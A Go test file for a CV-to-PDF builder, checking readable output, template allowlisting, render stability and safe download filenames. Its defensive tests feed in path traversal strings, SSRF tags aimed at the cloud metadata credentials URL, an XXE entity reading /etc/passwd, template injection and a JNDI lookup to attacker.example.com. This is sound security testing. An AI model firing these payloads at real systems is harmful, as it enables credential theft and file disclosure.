package cv_test

import (
	"bytes"
	"net"
	"net/http"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/Joakim-animate90/myjobfyt/backend/internal/domain/cv"
	"github.com/Joakim-animate90/myjobfyt/backend/internal/platform/docextract"
)

func builderSkills() []cv.Skill {
	return []cv.Skill{{RawLabel: "Go"}, {RawLabel: "PostgreSQL"}, {RawLabel: "Kubernetes"}}
}

func buildPDF(t *testing.T, parsed *cv.ParsedData, id cv.TemplateID) []byte {
	t.Helper()
	pdf, err := cv.BuildPDF(parsed, builderSkills(), id)
	if err != nil {
		t.Fatalf("BuildPDF: %v", err)
	}
	return pdf
}

func pdfText(t *testing.T, pdf []byte) string {
	t.Helper()
	result, err := docextract.Extract(pdf, "application/pdf", docextract.DefaultLimits())
	if err != nil {
		t.Fatalf("the generated CV could not be parsed: %v", err)
	}
	return result.Text
}

func TestABuiltCVIsATSParseable(t *testing.T) {
	// The reason the builder exists: output an applicant tracking system can read. A
	// CV that renders beautifully and extracts as nothing is rejected before a human
	// sees it.
	text := pdfText(t, buildPDF(t, goodCV(), cv.TemplateClassic))

	for _, want := range []string{
		"Joakim Candidate", "joakim@example.com", "Nairobi",
		"EXPERIENCE", "Senior Backend Engineer", "Acme Corporation", "Jan 2021",
		"EDUCATION", "University of Nairobi",
		"SKILLS", "PostgreSQL",
	} {
		if !strings.Contains(text, want) {
			t.Errorf("the built CV does not contain %q\n--- extracted ---\n%s", want, text)
		}
	}
}

func TestSectionsExtractInReadingOrder(t *testing.T) {
	text := pdfText(t, buildPDF(t, goodCV(), cv.TemplateClassic))

	order := []string{"Joakim Candidate", "EXPERIENCE", "EDUCATION", "SKILLS"}
	last := -1
	for _, marker := range order {
		at := strings.Index(text, marker)
		if at < 0 {
			t.Fatalf("%q is missing from the output", marker)
		}
		if at < last {
			t.Errorf("%q extracted out of order; a CV whose sections interleave has its "+
				"dates attached to the wrong employer", marker)
		}
		last = at
	}
}

func TestPreviewAndFinalRenderAreByteIdentical(t *testing.T) {
	// MJF-012 requires it, and it is only achievable because one renderer serves both
	// and carries no timestamp. Two calls here are exactly what a preview followed by a
	// download does.
	preview := buildPDF(t, goodCV(), cv.TemplateClassic)
	final := buildPDF(t, goodCV(), cv.TemplateClassic)

	if !bytes.Equal(preview, final) {
		t.Fatal("the preview and the final render differ, so what a candidate approves is not what they send")
	}
}

func TestOnlyAllowlistedTemplatesRender(t *testing.T) {
	// An allowlist that can be escaped by a crafted id is not an allowlist. These are
	// the shapes an attacker reaches for when a template name becomes a path.
	for _, id := range []cv.TemplateID{
		"", "unknown",
		"../../../etc/passwd",
		"/etc/passwd",
		"classic/../../secret",
		"file:///etc/passwd",
		"CLASSIC",  // case must not be a way in
		"classic ", // nor trailing whitespace
		"classic\x00evil",
	} {
		t.Run(string(id), func(t *testing.T) {
			if _, err := cv.BuildPDF(goodCV(), builderSkills(), id); err == nil {
				t.Fatalf("template id %q rendered", id)
			}
		})
	}

	// And the real ones do work, so the allowlist is not simply refusing everything.
	for _, info := range cv.Templates() {
		if _, err := cv.BuildPDF(goodCV(), builderSkills(), info.ID); err != nil {
			t.Errorf("allowlisted template %q failed: %v", info.ID, err)
		}
	}
}

func TestTemplateListIsStable(t *testing.T) {
	// Ranging a map is randomised; a chooser whose options reshuffled every request
	// would be unusable.
	first := cv.Templates()
	for i := 0; i < 20; i++ {
		next := cv.Templates()
		if len(next) != len(first) {
			t.Fatalf("template count changed between calls")
		}
		for j := range first {
			if next[j].ID != first[j].ID {
				t.Fatalf("template order changed on call %d", i)
			}
		}
	}
	for _, info := range first {
		if info.Description == "" {
			t.Errorf("template %q has no description for the candidate choosing it", info.ID)
		}
	}
}

// --- SSRF and local file inclusion ----------------------------------------------
//
// The renderer takes typed content and writes PDF operators. It has no URL resolver, no
// file reader and no stylesheet parser, so these payloads have nothing to act on. The
// tests assert that outcome rather than assuming it: the point is that CV content is
// candidate-controlled, and these are what someone would put in a job title.

func TestCVContentCannotCauseANetworkFetch(t *testing.T) {
	// A real listener, so a fetch would be observable rather than merely assumed
	// absent. If any payload below reached it, this fails.
	var hits int64
	listener, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatalf("listen: %v", err)
	}
	defer listener.Close()

	server := &http.Server{
		Handler: http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			atomic.AddInt64(&hits, 1)
			w.WriteHeader(http.StatusOK)
		}),
		ReadHeaderTimeout: 5 * time.Second,
	}
	go func() { _ = server.Serve(listener) }()
	defer func() { _ = server.Close() }()

	url := "http://" + listener.Addr().String() + "/payload.png"

	payloads := []string{
		`<img src="` + url + `">`,
		`<link rel="stylesheet" href="` + url + `">`,
		`<style>@import url("` + url + `");</style>`,
		`<style>body{background:url(` + url + `)}</style>`,
		`<iframe src="` + url + `"></iframe>`,
		`<object data="` + url + `"></object>`,
		`<script src="` + url + `"></script>`,
		`<svg><image href="` + url + `"/></svg>`,
		// Cloud metadata, the classic SSRF target.
		`<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">`,
	}

	for _, payload := range payloads {
		parsed := goodCV()
		// Every field a candidate controls, so no single sanitised field hides a gap.
		parsed.Contact.FullName = payload
		parsed.Summary = payload
		parsed.Experience[0].Title = payload
		parsed.Experience[0].Employer = payload
		parsed.Experience[0].Description = payload
		parsed.Experience[0].Achievements = []string{payload}
		parsed.Education[0].Institution = payload

		if _, err := cv.BuildPDF(parsed, builderSkills(), cv.TemplateClassic); err != nil {
			t.Fatalf("rendering failed on payload %q: %v", payload, err)
		}
	}

	// Generous: the renderer is synchronous, so anything it fetched would already have
	// arrived, but a stray goroutine would be caught here too.
	time.Sleep(300 * time.Millisecond)

	if got := atomic.LoadInt64(&hits); got != 0 {
		t.Fatalf("the renderer made %d request(s) to a URL embedded in CV content", got)
	}
}

func TestCVContentCannotReadLocalFiles(t *testing.T) {
	// A file reference must come out as text, not as the file. If it resolved, the
	// extracted PDF would contain the file's contents instead of the reference.
	payloads := []string{
		`file:///etc/passwd`,
		`<img src="file:///etc/passwd">`,
		`<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>`,
		`{{ readFile "/etc/passwd" }}`,
		`${file:/etc/passwd}`,
		`../../../../etc/passwd`,
	}

	for _, payload := range payloads {
		t.Run(payload, func(t *testing.T) {
			parsed := goodCV()
			parsed.Experience[0].Description = payload
			parsed.Summary = payload

			pdf, err := cv.BuildPDF(parsed, builderSkills(), cv.TemplateClassic)
			if err != nil {
				t.Fatalf("BuildPDF: %v", err)
			}

			text := pdfText(t, pdf)
			// /etc/passwd lines look like "root:x:0:0:root:/root:/bin/bash".
			for _, leaked := range []string{"root:x:", "/bin/bash", "/bin/sh", "daemon:x:"} {
				if strings.Contains(text, leaked) {
					t.Fatalf("the output contains %q, so the reference was resolved and the file read", leaked)
				}
			}
		})
	}
}

func TestATemplateExpressionIsRenderedAsText(t *testing.T) {
	// There is no template engine on the content path, so this comes out verbatim.
	// Worth pinning: adding one later would reintroduce server-side template injection,
	// and this test would fail rather than the vulnerability shipping quietly.
	parsed := goodCV()
	parsed.Experience[0].Employer = "{{ .Secret }}"
	parsed.Summary = "${jndi:ldap://attacker.example.com/a}"

	text := pdfText(t, buildPDF(t, parsed, cv.TemplateClassic))

	if !strings.Contains(text, "{{ .Secret }}") {
		t.Error("a template expression was not rendered verbatim, so something evaluated it")
	}
	if !strings.Contains(text, "jndi:ldap") {
		t.Error("a JNDI-style string was not rendered verbatim")
	}
}

func TestHTMLInCVContentIsNotInterpreted(t *testing.T) {
	// It comes out as the characters the candidate typed. Someone whose job title
	// genuinely contains a "<" should see it.
	parsed := goodCV()
	parsed.Experience[0].Title = "Engineer <C++> & Co"

	text := pdfText(t, buildPDF(t, parsed, cv.TemplateClassic))
	if !strings.Contains(text, "<C++>") {
		t.Errorf("angle brackets in a job title were altered: %q", text)
	}
}

// --- failure modes --------------------------------------------------------------

func TestAnOversizedCVStillRendersRatherThanCorrupting(t *testing.T) {
	// MJF-012: a failure must be clear, never a corrupt PDF. Rendering is bounded
	// computation with no subprocess to time out, so the relevant question is whether a
	// very large CV produces something valid.
	parsed := goodCV()
	for i := 0; i < 400; i++ {
		parsed.Experience = append(parsed.Experience, cv.Role{
			Title: "Engineer", Employer: "Employer", StartDate: "2020", EndDate: "2021",
			Description:  strings.Repeat("Delivered a measurable outcome. ", 12),
			Achievements: []string{strings.Repeat("Improved a thing. ", 10)},
		})
	}

	pdf, err := cv.BuildPDF(parsed, builderSkills(), cv.TemplateClassic)
	if err != nil {
		t.Fatalf("a large CV failed to render: %v", err)
	}
	result, err := docextract.Extract(pdf, "application/pdf", docextract.Limits{MaxPages: 500, MaxChars: 5_000_000})
	if err != nil {
		t.Fatalf("a large CV produced an unparseable PDF: %v", err)
	}
	if result.PageCount < 10 {
		t.Errorf("400 roles produced %d pages; content is being lost", result.PageCount)
	}
}

func TestBuildingWithNoParsedCVIsRefusedClearly(t *testing.T) {
	_, err := cv.BuildPDF(nil, nil, cv.TemplateClassic)
	if err == nil {
		t.Fatal("building succeeded with no CV content")
	}
	if !strings.Contains(strings.ToLower(err.Error()), "no parsed cv") {
		t.Errorf("the error does not explain what is missing: %v", err)
	}
}

func TestACVWithAnUnrenderableNameIsRefusedWithAdvice(t *testing.T) {
	// Substituting characters would put a CV in front of an employer with the
	// candidate's name mangled.
	parsed := goodCV()
	parsed.Contact.FullName = "候補者 太郎"

	_, err := cv.BuildPDF(parsed, builderSkills(), cv.TemplateClassic)
	if err == nil {
		t.Fatal("a name the base fonts cannot set was rendered anyway")
	}
	if !strings.Contains(err.Error(), "upload") {
		t.Errorf("the error does not tell the candidate what to do instead: %v", err)
	}
}

func TestMissingFieldsLeaveNoDanglingSeparators(t *testing.T) {
	// A CV with no phone must not read "joakim@example.com |  | Nairobi". It is the
	// sort of detail that makes a generated document look machine-made.
	parsed := goodCV()
	parsed.Contact.Phone = ""
	parsed.Contact.Location = ""
	parsed.Experience[0].EndDate = ""
	parsed.Experience[0].IsCurrent = false

	text := pdfText(t, buildPDF(t, parsed, cv.TemplateClassic))
	for _, bad := range []string{"|  |", "| |", " - \n", ",  ,"} {
		if strings.Contains(text, bad) {
			t.Errorf("the output contains a dangling separator %q", bad)
		}
	}
}

func TestBothTemplatesProduceParseableOutput(t *testing.T) {
	for _, info := range cv.Templates() {
		t.Run(string(info.ID), func(t *testing.T) {
			text := pdfText(t, buildPDF(t, goodCV(), info.ID))
			if !strings.Contains(text, "Joakim Candidate") {
				t.Errorf("template %q lost the candidate's name", info.ID)
			}
			if !strings.Contains(text, "Acme Corporation") {
				t.Errorf("template %q lost the employment history", info.ID)
			}
		})
	}
}

func TestDownloadNameIsSafeForAHeaderAndAFilesystem(t *testing.T) {
	// The value reaches a Content-Disposition header and then someone's filesystem, so
	// a quote is header injection and a separator is path traversal, in one field the
	// candidate controls entirely.
	cases := map[string]string{
		`Joakim Candidate`:       "Joakim-Candidate.pdf",
		`Zoe "Zed" Muller`:       "Zoe-Zed-Muller.pdf",
		`../../etc/passwd`:       "etcpasswd.pdf",
		`a"; filename="evil.exe`: "a-filenameevilexe.pdf",
		`name` + "\r\n" + `X: y`: "nameX-y.pdf",
		`/////`:                  "cv.pdf",
		``:                       "cv.pdf",
		`候補者`:                    "cv.pdf",
	}

	for input, want := range cases {
		t.Run(input, func(t *testing.T) {
			parsed := &cv.ParsedData{Contact: cv.Contact{FullName: input}}
			got := cv.DownloadNameFor(parsed)
			if got != want {
				t.Errorf("DownloadNameFor(%q) = %q, want %q", input, got, want)
			}
			for _, forbidden := range []string{`"`, "\r", "\n", "/", "\\", ";", ":"} {
				if strings.Contains(got, forbidden) {
					t.Errorf("filename %q contains %q", got, forbidden)
				}
			}
		})
	}
}
